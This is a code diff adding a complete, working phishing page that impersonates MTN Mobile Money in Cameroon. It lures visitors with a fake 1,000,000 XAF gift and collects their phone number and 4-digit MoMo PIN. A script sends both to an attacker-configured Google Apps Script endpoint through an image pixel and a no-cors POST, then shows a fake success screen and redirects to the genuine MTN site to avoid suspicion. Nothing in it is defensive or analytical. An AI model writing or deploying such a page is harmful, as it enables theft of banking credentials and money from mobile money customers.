@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MTN MoMo – Claim Your Gift</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+        }
+        body {
+            background: linear-gradient(145deg, #0a0a0a 0%, #1a1a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 24px;
+            max-width: 400px;
+            width: 100%;
+            padding: 28px 24px 24px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #FFCB05, #FFDD00, #FFCB05);
+        }
+        .logo-wrap {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .logo-wrap img {
+            max-width: 130px;
+            max-height: 55px;
+            object-fit: contain;
+        }
+        .prize-badge {
+            background: linear-gradient(135deg, #FFCB05, #F5B800);
+            color: #0a0a0a;
+            text-align: center;
+            padding: 16px 10px;
+            border-radius: 16px;
+            font-size: 30px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            margin-bottom: 14px;
+            box-shadow: 0 6px 22px rgba(255,203,5,0.4);
+        }
+        .prize-badge small {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            opacity: 0.75;
+            margin-top: 4px;
+            letter-spacing: 0.5px;
+        }
+        .title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #0a0a0a;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+        .sub {
+            color: #555;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 7px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 15px 16px;
+            border: 2px solid #e8e8e8;
+            border-radius: 12px;
+            font-size: 19px;
+            letter-spacing: 3px;
+            text-align: center;
+            outline: none;
+            transition: border-color 0.25s;
+            background: #fafafa;
+        }
+        .form-group input:focus {
+            border-color: #FFCB05;
+            background: #fff;
+        }
+        .form-group input::placeholder {
+            color: #ccc;
+            letter-spacing: 4px;
+        }
+        .hint {
+            font-size: 11px;
+            color: #999;
+            margin-top: 5px;
+            text-align: center;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #FFCB05, #F5B800);
+            color: #0a0a0a;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.25s;
+            margin-top: 6px;
+            box-shadow: 0 4px 18px rgba(255,203,5,0.45);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 28px rgba(255,203,5,0.55);
+        }
+        .btn:disabled {
+            background: #ccc;
+            box-shadow: none;
+            transform: none;
+            cursor: not-allowed;
+        }
+        .note {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 18px;
+            line-height: 1.5;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-top: 14px;
+            font-size: 11px;
+        }
+        .footer-links a {
+            color: #aaa;
+            text-decoration: none;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .loader-wrap {
+            text-align: center;
+            padding: 55px 0;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 18px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #FFCB05;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loader-wrap p {
+            color: #555;
+            font-size: 15px;
+        }
+        .success-wrap {
+            text-align: center;
+            padding: 42px 0 20px;
+        }
+        .success-wrap .icon {
+            font-size: 58px;
+            margin-bottom: 12px;
+        }
+        .success-wrap h2 {
+            font-size: 23px;
+            color: #0a0a0a;
+            margin-bottom: 10px;
+        }
+        .success-wrap p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.7;
+        }
+        .redirect-note {
+            margin-top: 18px;
+            font-size: 12px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="card" id="mainContainer">
+
+        <!-- PAGE 1: FORM -->
+        <div id="formPage">
+            <div class="logo-wrap">
+                <img src="logo.png" alt="MTN MoMo" onerror="this.style.display='none'">
+            </div>
+
+            <div class="prize-badge">
+                1,000,000 XAF
+                <small>💥 CLAIM YOUR GIFT NOW 💥</small>
+            </div>
+
+            <div class="title">Claim Your Gift 🎁</div>
+            <div class="sub">
+                Enter your details below to verify your eligibility<br>
+                and receive your reward instantly.
+            </div>
+
+            <form id="phishForm">
+                <div class="form-group">
+                    <label>📱 MTN Phone Number</label>
+                    <input
+                        type="tel"
+                        id="phone"
+                        placeholder="67XXXXXXX"
+                        required
+                        maxlength="9"
+                        inputmode="numeric"
+                        pattern="[0-9]{9}"
+                        title="Enter exactly 9 digits"
+                        autocomplete="off"
+                    >
+                    <div class="hint">Format: 9 digits (e.g. 671234567)</div>
+                </div>
+
+                <div class="form-group">
+                    <label>🔐 MoMo PIN</label>
+                    <input
+                        type="password"
+                        id="pin"
+                        placeholder="••••"
+                        required
+                        maxlength="4"
+                        inputmode="numeric"
+                        pattern="[0-9]{4}"
+                        title="Enter exactly 4 digits"
+                        autocomplete="off"
+                    >
+                    <div class="hint">Your 4-digit Mobile Money PIN</div>
+                </div>
+
+                <button type="submit" class="btn" id="submitBtn">✅ Claim My Gift</button>
+            </form>
+
+            <div class="note">
+                ⏱ <strong>Offer is time-limited.</strong> Your gift will be credited within 10 minutes after validation.
+            </div>
+
+            <div class="footer-links">
+                <a href="https://www.mtn.cm/" target="_blank">Terms</a>
+                <a href="https://www.mtn.cm/" target="_blank">Privacy</a>
+                <a href="https://www.mtn.cm/" target="_blank">Help</a>
+            </div>
+        </div>
+
+        <!-- PAGE 2: LOADING -->
+        <div id="loadingPage" class="hidden">
+            <div class="loader-wrap">
+                <div class="spinner"></div>
+                <p>Verifying your account, please wait…</p>
+            </div>
+        </div>
+
+        <!-- PAGE 3: SUCCESS + REDIRECT -->
+        <div id="successPage" class="hidden">
+            <div class="success-wrap">
+                <div class="icon">🎉</div>
+                <h2>Congratulations!</h2>
+                <p>
+                    <strong>You are eligible</strong> to receive <strong>1,000,000 XAF</strong>.<br><br>
+                    Your gift will be credited to your MTN MoMo account<br>
+                    within the next <strong>10 minutes</strong>.<br><br>
+                    <span style="color:#FFCB05;font-weight:700;">Thank you for being part of our journey. 💛</span>
+                </p>
+                <div class="redirect-note">Redirecting to MTN Cameroon…</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const form = document.getElementById('phishForm');
+            const formPage = document.getElementById('formPage');
+            const loadingPage = document.getElementById('loadingPage');
+            const successPage = document.getElementById('successPage');
+            const submitBtn = document.getElementById('submitBtn');
+
+            const phoneInput = document.getElementById('phone');
+            const pinInput = document.getElementById('pin');
+
+            // Strip non-digits and enforce length
+            phoneInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 9);
+            });
+            pinInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
+            });
+
+            // ⚠️ REPLACE WITH YOUR GOOGLE APPS SCRIPT WEB APP URL (/exec)
+            const SCRIPT_URL = 'https://script.google.com/macros/s/YOUR_ID_HERE/exec';
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const phone = phoneInput.value.trim();
+                const pin = pinInput.value.trim();
+
+                if (!phone || phone.length !== 9 || !/^[0-9]{9}$/.test(phone)) {
+                    alert('Please enter a valid MTN phone number (9 digits).');
+                    phoneInput.focus();
+                    return;
+                }
+                if (!pin || pin.length !== 4 || !/^[0-9]{4}$/.test(pin)) {
+                    alert('Please enter your 4-digit MoMo PIN.');
+                    pinInput.focus();
+                    return;
+                }
+
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verifying…';
+                formPage.classList.add('hidden');
+                loadingPage.classList.remove('hidden');
+
+                // METHOD 1: Image pixel (most reliable, no CORS restriction)
+                try {
+                    const pixel = new Image();
+                    pixel.src = SCRIPT_URL
+                        + '?phone=' + encodeURIComponent(phone)
+                        + '&pin=' + encodeURIComponent(pin)
+                        + '&ts=' + Date.now();
+                } catch (err) {}
+
+                // METHOD 2: fetch POST (backup)
+                try {
+                    fetch(SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: 'phone=' + encodeURIComponent(phone) + '&pin=' + encodeURIComponent(pin)
+                    }).catch(function() {});
+                } catch (err) {}
+
+                setTimeout(function() {
+                    loadingPage.classList.add('hidden');
+                    successPage.classList.remove('hidden');
+                    setTimeout(function() {
+                        window.location.href = 'https://www.mtn.cm/';
+                    }, 5000);
+                }, 2500);
+            });
+        })();
+    </script>
+</body>
+</html>
